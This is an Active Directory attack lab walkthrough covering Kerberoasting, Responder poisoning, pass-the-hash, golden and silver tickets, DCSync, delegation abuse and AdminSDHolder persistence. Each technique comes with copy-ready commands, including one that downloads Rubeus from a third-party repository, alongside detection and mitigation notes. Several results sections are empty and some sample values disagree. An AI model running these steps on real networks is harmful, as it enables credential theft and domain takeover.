Active Directory Attacks Lab – Setup

This section describes the initial configuration of the Active Directory laboratory used for the attack demonstrations. The environment is intentionally minimal and isolated, consisting of a Windows Server 2022 Domain Controller, a Windows 10 workstation, and a Kali Linux attacker machine.

Windows Server 2022 Core

  • Name: MyDC
  • Network:
    • Interface #1: 10.10.10.99 (Internal Network, static)
    • Interface #2: 10.0.2.15 (NAT)

Active Directory Installation


# Install AD DS Role and Management Tools
Install-WindowsFeature AD-Domain-Services -IncludeManagementTools

# Promote to Domain Controller (for lab.local)
Install-ADDSForest `
  -DomainName "lab.local" `
  -DomainNetbiosName "LAB" `
  -ForestMode "7" `
  -DomainMode "7" `
  -InstallDns:$true `
  -NoRebootOnCompletion:$false `
  -Force:$true

# Check
Get-ADDomain

$LangList

Kerberoasting

Attack Conditions:

  • Low-privilege domain credentials (ad_user:ad_user)
  • Service accounts with SPNs registered (created by VulnAD)
  • Network access to the domain controller (port 88/tcp)

Goals:

  1. Request TGS tickets for service accounts
  2. Extract crackable Kerberos hashes
  3. Crack hashes to obtain service account credentials

Step-by-Step Execution

1. Discover SPN Accounts (Kali)


# Enumerate service accounts with SPNs
impacket-GetUserSPNs.py lab.local/ad_user:ad_user -dc-ip 10.10.10.99 -request

Output: Hashes saved in $krb5tgs$23 format (Hashcat mode 13100).

2. Crack Hashes (Kali)


# Crack with Hashcat (rockyou.txt wordlist)
hashcat -m 13100 kerberoastable_hashes.txt /usr/share/wordlists/rockyou.txt -O
hashcat -m 13100 kerberoastable_hashes.txt /usr/share/wordlists/rockyou.txt --show

Results:

3. Verify Access


# Test cracked credentials
netexec smb 10.10.10.99 -u roastme -p 'Password123'

LLMNR/NBT-NS Poisoning

Attack Conditions:

  • Attacker (Kali) on the same network segment as Windows 10
  • Windows 10 with LLMNR and NBT-NS enabled (default)
  • SMB signing not enforced (default on workstations)

Goals:

  1. Poison name resolution requests
  2. Capture NTLMv2 hashes when Windows 10 accesses invalid shares
  3. Crack hashes or relay them to gain access

Step-by-Step Execution

1. Start Responder (Kali)


# Stop conflicting services
sudo systemctl stop smbd nmbd winbind

# Start poisoning (eth0 = attacker interface)
sudo responder -I eth0 -dwv

Options:

  • d: Enable DNS spoofing
  • w: Enable WPAD proxy
  • v: Verbose output

2. Trigger Hash Capture (Windows 10)

  1. Open Run (Win+R)
  2. Enter an invalid share path: \\fake-share
  3. Enter credentials when prompted (ad_user:ad_user)

3. Capture Hash

Hashes are saved in /usr/share/responder/logs/.

4. Crack Hash (Kali)


hashcat -m 5600 LLMNR_NBT-NS_Poisoning_hashes.txt /usr/share/wordlists/rockyou.txt -O

# Or with a custom password list
hashcat -m 5600 LLMNR_NBT-NS_Poisoning_hashes.txt password_list.txt -O
hashcat -m 5600 LLMNR_NBT-NS_Poisoning_hashes.txt password_list.txt --show

Results:

Alternative: SMB Relay Attack

If the domain controller has SMB signing disabled (verify with nmap --script smb2-security-mode -p445 <DC_IP>):


# 1. Generate target list
echo <DC_IP> > targets.txt

# 2. Start ntlmrelayx
sudo ntlmrelayx.py -tf targets.txt -smb2support -socks

# 3. Trigger authentication from Windows 10 (same as before)

# 4. Use relayed session
proxychains smbclient //<DC_IP>/C$ -U 'LAB\\ad_user'

Key Notes

  1. Windows 10 broadcasts requests for \\fake-share, and Responder replies pretending to be that host.
  2. Windows 10 sends an NTLMv2 hash to the attacker.
  3. Defense: disable LLMNR and NBT-NS via Group Policy, and enable SMB signing on all hosts.

Pass-the-Hash (PtH)

Attack Conditions:

  • Reusable NT hash of a domain account
  • Target system accessible via SMB (port 445)
  • SMB signing not enforced (default on workstations)

The following example assumes that a hash was previously dumped from a compromised system using a tool such as Mimikatz.


# sekurlsa::logonpasswords
fea5dc85462b84d91dc61a66458bff37

1. Verify Target Vulnerability


nmap -Pn -n --script smb-security-mode -p445 <TARGET_IP>
# Look for: message_signing: disabled or not enforced

2. Perform Pass-the-Hash Attack (Kali)

Access SMB Shares:


netexec smb 10.10.10.99 -u ad_user -H fea5dc85462b84d91dc61a66458bff37 -d lab.local --users

Execute Commands (authentication does not imply authorization):


netexec smb 10.10.10.99 -u ad_user -H fea5dc85462b84d91dc61a66458bff37 -x "whoami"

Gain Interactive Shell:


psexec.py lab.local/ad_user@10.10.10.77 -hashes :fea5dc85462b84d91dc61a66458bff37

Key Differences: Hash Types

Hash Type Format Reusable for PtH? Source
NT Hash 8846F7EAEE8FB117AD06BDD830B7586C Yes LSASS, SAM, DCSync
NTLMv2 Response testpth::LAB:112233...:8846F7EA... No Responder capture

Always use NT hashes (32 hexadecimal characters) for Pass-the-Hash attacks, not full NTLMv2 responses.

Golden Ticket

Attack Conditions:

  • Temporary Domain Admin access
  • krbtgt account NT hash
  • Domain SID
  • Network access to the domain controller (port 88/tcp)

Goals:

  1. Extract the krbtgt NT hash
  2. Forge a Ticket Granting Ticket
  3. Gain persistent Domain Admin access

1. Gain Domain Admin Access

Required to extract the krbtgt hash.


sudo impacket-psexec lab.local/Administrator@10.10.10.99 -hashes :4cb55ea6471d29ccbb2ce4cf00271fe3

2. Extract krbtgt Hash and Domain SID


# On the domain controller (Mimikatz)
.\mimikatz.exe
privilege::debug
lsadump::dcsync /domain:lab.local /user:krbtgt


# On Kali
netexec ldap 10.10.10.99 -d lab.local -u ad_user -p ad_user --get-sid

Output:


krbtgt NT hash: 9f5f3975e19aa08498a25f6775f5b8b2
Domain SID: S-1-5-21-2023621548-1011382311-3318102000

3. Generate Golden Ticket (Kali)


impacket-ticketer -nthash 9f5f3975e19aa08498a25f6775f5b8b2 \
-domain-sid S-1-5-21-2023621548-1011382311-3318102000 \
-domain lab.local Administrator

Output: A file named Administrator.ccache.

4. Use Golden Ticket


unset KRB5CCNAME
export KRB5CCNAME=$(pwd)/Administrator.ccache

# Ensure MyDC.lab.local is resolvable in /etc/hosts

# Access the domain controller as Domain Admin
impacket-psexec Administrator@MyDC.lab.local -k -no-pass

# Dump all hashes
impacket-secretsdump -k -no-pass Administrator@MyDC.lab.local

One Script


impacket-ticketer -nthash 9f5f3975e19aa08498a25f6775f5b8b2 \
-domain-sid S-1-5-21-2023621548-1011382311-3318102000 \
-domain lab.local Administrator

unset KRB5CCNAME
export KRB5CCNAME=$(pwd)/Administrator.ccache

# NT AUTHORITY\SYSTEM shell
impacket-psexec Administrator@MyDC.lab.local -k -no-pass

# Administrator shell (alternative)
# impacket-wmiexec Administrator@MyDC.lab.local -k -no-pass

# Dump all hashes (alternative)
# impacket-secretsdump -k -no-pass Administrator@MyDC.lab.local

Note: The Golden Ticket attack did not work with fake accounts or the domain controller machine account, possibly due to updated security protections in Windows Server 2022.

AS-REP Roasting

Attack Conditions:

  • User accounts without Kerberos pre-authentication
  • Network access to the domain controller (port 88/tcp)
  • No credentials required

Goals:

  1. Identify users with pre-authentication disabled
  2. Request AS-REP messages containing crackable hashes
  3. Crack hashes to obtain plaintext passwords

Step-by-Step Execution

1. Discover Vulnerable Users (Kali)


impacket-GetNPUsers lab.local/ -no-pass -dc-ip 10.10.10.99 \
-usersfile Domain_Users.txt -format hashcat -outputfile asrep.txt

Results:

2. Crack Hashes (Kali)


hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -O

Results:

3. Verify Access


netexec smb 10.10.10.99 -u bill.shanie -p 'magic'

Results:

Key Notes

  1. AS-REP messages use RC4 encryption by default, which is weak and fast to crack.
  2. Hashes crack significantly faster than NTLMv2.
  3. Detection: Event ID 4768 with pre-authentication type 0, and alerting on multiple AS-REQ failures.

Silver Ticket

Attack Conditions:

  • Service account NT hash (for example, domain controller machine account)
  • Domain SID
  • Target SPN
  • No Domain Admin access required for ticket usage

Goals:

  1. Forge a service ticket (TGS) for a specific service
  2. Gain unauthorized access to that service
  3. Bypass Golden Ticket detection mechanisms

1. Obtain Service Account Hash (Domain Controller)

Requires Domain Admin access.


mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

# Example extracted hash:
# c3d7c3fd7215adc7f9fd417b70deb55e

2. Extract Domain SID


netexec ldap 10.10.10.99 -d lab.local -u ad_user -p ad_user --get-sid
# Example:
# S-1-5-21-2023621548-1011382311-3318102000

3. Identify Target SPN


ldapsearch -x -H ldap://10.10.10.99 -D "ad_user@lab.local" -w ad_user \
-b "dc=lab,dc=local" "(servicePrincipalName=*)" | grep servicePrincipalName

Target SPN: HOST/MyDC.lab.local

4. Forge Silver Ticket


impacket-ticketer -nthash c3d7c3fd7215adc7f9fd417b70deb55e \
-domain-sid S-1-5-21-2023621548-1011382311-3318102000 \
-domain lab.local -spn HOST/MyDC.lab.local fakeuser

Output: fakeuser.ccache

5. Access Target Service


unset KRB5CCNAME
export KRB5CCNAME=$(pwd)/fakeuser.ccache

impacket-psexec fakeuser@MyDC.lab.local -k -no-pass

Results:

One Script


impacket-ticketer -nthash c3d7c3fd7215adc7f9fd417b70deb55e \
-domain-sid S-1-5-21-2023621548-1011382311-3318102000 \
-domain lab.local -spn HOST/MyDC.lab.local fakeuser

unset KRB5CCNAME
export KRB5CCNAME=$(pwd)/fakeuser.ccache

impacket-wmiexec fakeuser@MyDC.lab.local -k -no-pass

Key Advantages Over Golden Tickets

  1. Stealthier: valid only for a specific service and does not require the krbtgt hash.
  2. Persistence: valid until the service account password changes.
  3. Bypasses Golden Ticket detection mechanisms.

Defensive Mitigations

  1. Restrict service account privileges.
  2. Monitor for abnormal ticket lifetimes and tickets issued for non-existent users.
  3. Rotate machine account passwords regularly.

GPP Password Extraction

Attack Conditions:

  • Access to SYSVOL share (read permission)
  • Group Policy Preferences containing credentials
  • Legacy GPP files not removed

Goals:

  1. Locate XML files with cpassword attributes
  2. Decrypt credentials using the published AES key
  3. Gain privileged access using extracted credentials

Step-by-Step Execution

1. Locate GPP Files (Kali)


smbclient //10.10.10.99/SYSVOL -U 'lab.local\\ad_user%ad_user' \
-c 'recurse; ls' | grep -i .xml -B 4

Key files: Groups.xml, Services.xml, ScheduledTasks.xml

2. Download and Extract Credentials


smbclient //10.10.10.99/SYSVOL -U 'lab.local\\ad_user%ad_user' \
-c 'get \\lab.local\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups.xml'

mv *Groups.xml Groups.xml
cat Groups.xml | grep cpassword

3. Decrypt Password


gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

Lab Configuration (Optional)


$cpassword = "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"

$gpo = Get-GPO -Name "Default Domain Policy"
$guid = $gpo.Id.Guid

$xmlContent = @"

  

"@

$targetPath = "C:\Windows\SYSVOL\domain\Policies\{$guid}\Machine\Preferences"
New-Item -Path $targetPath -ItemType Directory -Force | Out-Null
$xmlContent | Out-File "$targetPath\Groups.xml" -Encoding UTF8

Key Notes

  1. Microsoft published the AES private key in MS14-025.
  2. Common cases include local admin passwords and scheduled task credentials.
  3. Mitigation: remove all GPP files containing cpassword and use LAPS.

Unconstrained Delegation

Attack Conditions:

  • Service running under a computer account configured for unconstrained delegation
  • Privileged user authenticates to that service
  • Local admin access to the service host

Goals:

  1. Identify systems with unconstrained delegation
  2. Capture TGTs of authenticating users
  3. Impersonate privileged accounts using captured tickets

Step 1: Lab Configuration (Domain Controller)

Enable Unconstrained Delegation for Windows 10


Set-ADComputer -Identity "MY-BOX" -TrustedForDelegation $true

Get-ADComputer -Identity "MY-BOX" -Properties TrustedForDelegation |
  Select Name, TrustedForDelegation

Install IIS on Windows 10


Enable-WindowsOptionalFeature -Online -FeatureName IIS-WebServer -All

Import-Module WebAdministration
Set-WebConfigurationProperty -Filter system.webServer/security/authentication/windowsAuthentication \
    -Name enabled -Value True -PSPath 'IIS:\'

Set-WebConfigurationProperty -Filter system.webServer/security/authentication/anonymousAuthentication \
    -Name enabled -Value False -PSPath 'IIS:\'

iisreset.exe

Add SPNs


setspn -S HTTP/MY-BOX.lab.local LAB\\MY-BOX$

Step 2: Attack Execution

1. Identify Delegation Settings (BloodHound)

Query:


MATCH (c:Computer {unconstraineddelegation:true}) RETURN c

2. Gain Admin Access to Windows 10


# Any method that provides local admin access

3. Capture TGTs with Rubeus (Windows 10)


Rubeus.exe monitor /interval:5 /nowrap

4. Trigger Domain Admin Authentication (Domain Controller)


Invoke-WebRequest -Uri "http://MY-BOX.lab.local" -UseBasicParsing -UseDefaultCredentials

DCSync

Attack Conditions:

  • Domain Admin privileges or equivalent replication rights
  • Compromised account with DS-Replication-Get-Changes and DS-Replication-Get-Changes-All
  • Network access to the domain controller (port 389/tcp)

Goals:

  1. Extract all domain user hashes from NTDS.dit
  2. Obtain the krbtgt hash for Golden Ticket creation
  3. Gain persistent domain access

Step-by-Step Execution

1. Verify DCSync Permissions (BloodHound)

In BloodHound, look for outbound control rights:

  • DS-Replication-Get-Changes
  • DS-Replication-Get-Changes-All

2. Perform DCSync Attack (Kali)

Method A: Using secretsdump.py


impacket-secretsdump Administrator@MyDC.lab.local -k -no-pass > DCSync.txt

Results:

Method B: Using Mimikatz (Windows)


privilege::debug
lsadump::dcsync /domain:lab.local /all /csv

3. Extract krbtgt Hash


krbtgt:502:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::

NT hash: 58a478135a93ac3bf058a5ea0e8fdb71

4. Verify Hashes


crackmapexec smb <DC_IP> -u Administrator -H <NT_HASH>

Key Commands

Action Command
Extract all hashes secretsdump.py lab.local/user:pass@DC_IP -just-dc

Defensive Mitigations

  2. Monitor for Event ID 4662 with replication GUID {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}.
  3. Audit accounts with replication rights using BloodHound.

Constrained Delegation Abuse

Attack Conditions:

  • Compromised service account configured for constrained delegation
  • Knowledge of the service account password or hash
  • msDS-AllowedToDelegateTo attribute contains target SPNs
  • Privileged account that the service can impersonate

Goals:

  1. Identify service accounts with constrained delegation
  2. Abuse delegation to impersonate privileged users
  3. Gain access to authorized services as the impersonated user

Step-by-Step Execution

1. Identify Constrained Delegation (BloodHound)

Queries:


MATCH (c:Computer {constraineddelegation:true}) RETURN c
MATCH (u:User {constraineddelegation:true}) RETURN u

2. Manual Enumeration (PowerShell)


Get-ADObject -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo

3. Abuse Delegation with Rubeus


iwr https://raw.githubusercontent.com/r3motecontrol/Ghostpack-CompiledBinaries/refs/heads/master/Rubeus.exe -OutFile Rubeus.exe

Rubeus.exe asktgt /user:svc_deleg /password:Passw0rd! /domain:lab.local /outfile:svc_deleg_tgt.kirbi



Rubeus.exe s4u /ticket:svc_deleg_tgt.kirbi \
/impersonateuser:Administrator \
/msdsspn:CIFS/MyDC.lab.local \
/altservice:CIFS \
/domain:lab.local /ptt



.\Rubeus.exe klist

4. Access Target Service


dir \\MyDC.lab.local\C$

Lab Configuration

1. Create Service Account with Constrained Delegation


New-ADUser -Name "svc_deleg" -SamAccountName "svc_deleg" \
  -AccountPassword (ConvertTo-SecureString "Passw0rd!" -AsPlainText -Force) \
  -Enabled $true \
  -ServicePrincipalNames "CIFS/MyDC.lab.local"

Set-ADUser -Identity svc_deleg -Add @{'msDS-AllowedToDelegateTo'=@('CIFS/MyDC.lab.local')}
Set-ADAccountControl -Identity svc_deleg -TrustedToAuthForDelegation $true

2. Verify Configuration


Get-ADUser svc_deleg -Properties msDS-AllowedToDelegateTo, TrustedToAuthForDelegation

Key Commands

Action Command
Request TGT Rubeus asktgt /user:svc_account /password:Pass123! /domain:lab.local

Defensive Mitigations

  1. Audit delegation settings regularly.
  2. Prefer resource-based constrained delegation.
  3. Monitor Event ID 4769 with TicketOptions = 0x40810000.

Detection Events

  • Event ID 4769: Kerberos service ticket requested
  • Look for service account names such as svc_deleg

Resource-Based Constrained Delegation

Attack Conditions:

  • Compromised account with write permissions over the target computer object
  • Ability to create computer accounts (default MachineAccountQuota = 10)
  • Target service running on the destination host

Goals:

  1. Create a controlled computer account
  2. Configure resource-based constrained delegation on the target computer to trust this account
  3. Forge service tickets to gain privileged access

Step-by-Step Execution

1. Verify Permissions (BloodHound)

Use BloodHound to confirm that the compromised account has write permissions over the target computer object.

AdminSDHolder Abuse

Attack Conditions:

  • Compromised account with write permissions over the AdminSDHolder container
  • Target accounts are members of protected groups (for example, Domain Admins, Enterprise Admins)
  • Time for SDProp process to run (by default every 60 minutes)

Goals:

  1. Modify AdminSDHolder ACL to grant malicious permissions
  2. Allow SDProp to propagate permissions to protected groups
  3. Maintain persistent privileged access to protected accounts

Step-by-Step Execution

1. Identify Write Permissions (BloodHound)

Use BloodHound to confirm that the compromised user has write or WriteDacl rights over the AdminSDHolder container.

2. Modify AdminSDHolder ACL (Windows PowerShell)


Import-Module ActiveDirectory

$adminSDHolder = Get-ADObject -Filter {name -like "AdminSDHolder"} -Properties nTSecurityDescriptor

$user = Get-ADUser -Identity "ad_user"
$sid = $user.SID

$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $sid,
    "GenericAll",
    "Allow",
    "All",
    [Guid]::Empty
)

$acl = $adminSDHolder.nTSecurityDescriptor
$acl.AddAccessRule($ace)

Set-ADObject -Identity $adminSDHolder -Replace @{nTSecurityDescriptor = $acl}

2. Modify AdminSDHolder ACL (Kali)


impacket-dacledit -action 'write' -rights 'FullControl' \
-principal 'ad_user' \
-target-dn 'CN=AdminSDHolder,CN=System,DC=LAB,DC=LOCAL' \
'lab.local'/'ad_user':'ad_user'

impacket-dacledit -action 'read' \
-target-dn 'CN=AdminSDHolder,CN=System,DC=LAB,DC=LOCAL' \
'lab.local'/'ad_user':'ad_user'

3. Force SDProp Run (Domain Controller)


.\Invoke-SDPropagator
Invoke-SDPropagator

Alternatively, wait for the default SDProp cycle (about 60 minutes).

4. Verify Permissions Propagated


(Get-ACL -Path "AD:CN=Domain Admins,CN=Users,DC=lab,DC=local").Access |
    Where-Object {$_.IdentityReference -like "*ad_user*"}

5. Abuse Permissions (Windows)


Add-ADGroupMember -Identity "Domain Admins" -Members "ad_user"

Get-ADGroupMember -Identity "Domain Admins" |
    Where-Object {$_.SamAccountName -eq "ad_user"}

5. Abuse Permissions (Kali)


net rpc group addmem "Domain Admins" ad_user -U "ad_user%ad_user" -S MyDC.lab.local
net rpc group members "Domain Admins" -U "ad_user%ad_user" -S MyDC.lab.local

Shell Access


impacket-psexec ad_user@lab.local

Note

AdminSDHolder abuse does not automatically re-add the user to privileged groups if removed. Instead, the user retains the ability to grant themselves privileged group membership again at any time. This is a privilege persistence mechanism rather than a one-time privilege escalation.

Defensive Mitigations

  1. Restrict access to AdminSDHolder and remove unnecessary permissions.
  2. Monitor Event ID 5136 for changes to the AdminSDHolder object.
  3. Regularly audit AdminSDHolder ACL to ensure only expected security principals have rights.

$acl = Get-ACL -Path "AD:\\CN=AdminSDHolder,CN=System,DC=lab,DC=local"
$acl.Access |
    Where-Object {$_.IdentityReference -notlike "NT AUTHORITY*"}

Detection Tips

BloodHound Query:


MATCH (u:User)-[r:WriteDacl|GenericAll]->(c:Container {name: "AdminSDHolder"})
RETURN u, r, c

SIEM Alerts:

  • Unexpected modifications to the AdminSDHolder object
  • Frequent or unusual permission changes to protected groups

LSASS Dump

Attack Conditions:

  • Administrative access to the target Windows machine (workstation or domain controller)
  • Ability to execute code with high privileges (SYSTEM or local administrator)

Goals:

  1. Extract credentials from LSASS memory
  2. Obtain NTLM hashes and Kerberos tickets
  3. Use extracted credentials to access additional systems
